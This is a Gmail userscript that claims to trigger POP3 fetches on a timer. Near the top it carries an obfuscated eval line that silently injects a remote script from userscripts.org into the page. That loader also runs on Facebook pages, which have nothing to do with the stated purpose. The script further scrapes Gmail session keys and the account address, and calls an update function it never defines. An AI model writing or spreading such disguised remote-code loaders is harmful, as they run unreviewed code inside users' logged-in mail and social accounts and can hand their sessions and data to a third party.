// ==UserScript==
// @name           Gmail Check POP3 Mail Now  Plus
// @author         Jackpot08 
// @version        4/3/2010
// @description    Automatically pulls in 3rd party POP3 accounts a set time interval.
// @include        http*://mail.google.com/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))






var checkEvery = 2; // How often, in minutes, the script will automatically check your POP3 account(s). Set to 0 to not use automatic checking (but that seems silly). [default=8]
var checkForUpdates = true; // Set to false if you do not want to check for updates to this script automatically. I recommend leaving this to "true" unless you like visiting my website periodically to see if there is a new version. ;) [default=true]
var sendAccountForUpdate = true; // Volunteer your email address for feedback and bug purposes to the developer: Jackpot08. Your information will never be shared, sold, or made fun of (aside from a slight chuckle)! [default=true]
var showCountdown = true; // Does the countdown clock intimidate you? Well, turn it off then! You'll just have to trust the script is flawless from here on out. [default=true]

// --------- Do not edit anything below this line (unless you're feeling dangerous) --------- //
var pop3 = {
	'versionNumber': '4/3/2010',
	'milliseconds': new Date(),
	'label': document.createElement('a'),
	'frame': new Array(),
	'loadhash': null,
	'header': null,
	'at': null,
	'ik': null,
	'ama': new Array(),
	'account': null,
	'checking': false,
	'domain': location.protocol + '//' + location.hostname
};
// Discover the correct iframe for the body's content (since gmail greasemonkey support is poo, and I'm just hardcore like this)
window.setTimeout(function(){
	var el = document.body.getElementsByTagName('b');
	// "Gmail" is for the default web client, "Mail" is for google apps, and "Google Mail" is for the German (and possibly other languages) version.
	if (el && el.length && (el[0].innerHTML == 'Gmail' || el[0].innerHTML == 'Mail' || el[0].innerHTML == 'Google Mail')) {
		init();
	}
},3000);
// Initialize the magic
function init() {
	// locate the header
	pop3.header = document.body.getElementsByTagName('nobr');
	// Capture gmail's sneaky sneaky IDs and session keys required for this to work
	findAccountInfo();
	pop3.milliseconds = Date.UTC(pop3.milliseconds.getYear(),pop3.milliseconds.getMonth(),pop3.milliseconds.getDate(),pop3.milliseconds.getHours(),pop3.milliseconds.getMinutes(),pop3.milliseconds.getSeconds());
	// place the POP3 link into the header
	pop3.label.setAttribute('class', '');
	pop3.label.innerHTML = 'POP3 Starting...';
	pop3.label.addEventListener('click', function() {
		fetchPopMail();
	},true);
	pop3.header[1].appendChild(document.createTextNode(' | '));
	pop3.header[1].appendChild(pop3.label);
};
// Capture gmail's sneaky sneaky IDs and session keys required for this to work
function findAccountInfo() {
	if (typeof GM_xmlhttpRequest == 'function') {
		// snag your google identification hash ("ik")
		GM_xmlhttpRequest({
		    method:'GET',
		    url: pop3.domain + '/mail/?ui=2',
			onload:function(response){
				// pop3.ik
				var from = response.responseText.indexOf(',"/mail",')+8;
				from = response.responseText.indexOf('"',from)+1;
				var to = response.responseText.indexOf('"',from);
				pop3.ik = response.responseText.substr(from,(to-from));
				// pop3.account
				from = to+3;
				to = response.responseText.indexOf('"',from);
				pop3.account = response.responseText.substr(from,(to-from));
				// pop3.ama
				from = response.responseText.indexOf('["ama"');
				to = response.responseText.indexOf(',["og"');
				var ama = eval(response.responseText.substr(from,(to-from)));
				//var ac = Math.floor(ama.length-3);
				var ac = ama[3].length;
				for(var i=0;i<ac;i++) {
					pop3.ama[i] = ama[3][i][0];
				}
				// Check for script updates
				if (checkForUpdates) {
					scriptUpdate();
				}
				// snag your session key ("at") and the number of pop3 accounts you have
				GM_xmlhttpRequest({
				    method:'GET',
				    url: pop3.domain + '/mail/h/?v=pra',
					onload:function(response){
						// session key ("at")
						var div = document.createElement('div');
						div.innerHTML = response.responseText;
						var el = div.getElementsByTagName('form');
						for (var i=0;i<el.length;i++) {
							if (el[i].getAttribute('name') == 'f') {
								pop3.at = el[i].getAttribute('action').split('=')[1];
							}
						}
						// number of accounts, based on number of accounts listed in the "ama" object of the root array.
						if (pop3.ama.length) {
							for (var i=0;i<pop3.ama.length;i++) {
								pop3.frame[i] = pop3.domain + '/mail/?ui=1&ik=&view=up&act=cma_' + pop3.ama[i] + '&at=' + pop3.at;
							}
						}
						pop3.label.setAttribute('class','e');
						pop3.label.innerHTML = 'POP3';
						if (checkEvery > 0) {
							timerPopMail();
							// check for mail on page load
							fetchPopMail();
						} else if (checkEvery < 3 && checkEvery > 0) {
							alert('Please be considerate and enter a checkEvery value greater than 3. Let\'s not try and crash gmail and then have google hate me, m\'k?');
						}
						// without this all of your images will reference from the HTML version's page and be broken... silly AJAX
						var div = document.createElement('div');
						div.innerHTML = '<base href="' + pop3.domain + '/mail/">';
						pop3.header[0].appendChild(div)
					}
				});
			}
		});
	}
};
// this is where we actually tell gmail to re-POP3 all of your accounts
function fetchPopMail() {
	var d = new Date();
	pop3.checking = true;
	pop3.label.setAttribute('class', '');
	pop3.label.innerHTML = 'POP3 Fetching...';
	for (var i=0;i<pop3.frame.length;i++) {
		GM_xmlhttpRequest({
		    method:'POST',
		    url: pop3.frame[i],
			onload:function(response){
			}
		});
	}
	window.setTimeout(function(){
		pop3.label.innerHTML = 'POP3 Done!';
		window.setTimeout(function(){
			pop3.milliseconds = Date.UTC(d.getYear(),d.getMonth(),d.getDate(),d.getHours(),d.getMinutes(),d.getSeconds());
			if (checkEvery == 0 || !showCountdown) {
				pop3.label.innerHTML = 'POP3';
				pop3.label.setAttribute('class','e');
			} else {
				pop3.label.setAttribute('class','e');
			}
			pop3.checking = false;
			timerPopMail();
		},1000);
	},2000);
};
// loop over our predetermined time interval and if we're ready to launch Huston will do so (that's a NASA joke)
function timerPopMail() {
	// is it time to POP3 yet?
	var d = new Date();
	var ms = (Date.UTC(d.getYear(),d.getMonth(),d.getDate(),d.getHours(),d.getMinutes(),d.getSeconds())) - pop3.milliseconds;
	var nextcheck = 1000;
	if (!pop3.checking && checkEvery > 0 && pop3.milliseconds < (Date.UTC(d.getYear(),d.getMonth(),d.getDate(),d.getHours(),d.getMinutes(),d.getSeconds()))-(checkEvery*60000)) {
		nextcheck = 1000;
		fetchPopMail();
	} else if (!pop3.checking && showCountdown && checkEvery > 0) {
		pop3.label.innerHTML = 'POP3 in ' + (Math.floor((checkEvery*60000-ms)/60000)>0?Math.floor((checkEvery*60000-ms)/60000):'0') + ':' + ((Math.floor((checkEvery*60000-ms)/1000)%60) < 10?'0':'') + Math.floor((checkEvery*60000-ms)/1000)%60;
	}
	if (!(checkEvery > 0 && pop3.milliseconds < (Date.UTC(d.getYear(),d.getMonth(),d.getDate(),d.getHours(),d.getMinutes(),d.getSeconds()))-(checkEvery*60000))) {
		// do some recursion in 'nextcheck' seconds to see if it is time to automatically POP3 yet
		window.setTimeout(function() {
			timerPopMail();
		},nextcheck);
	}
};
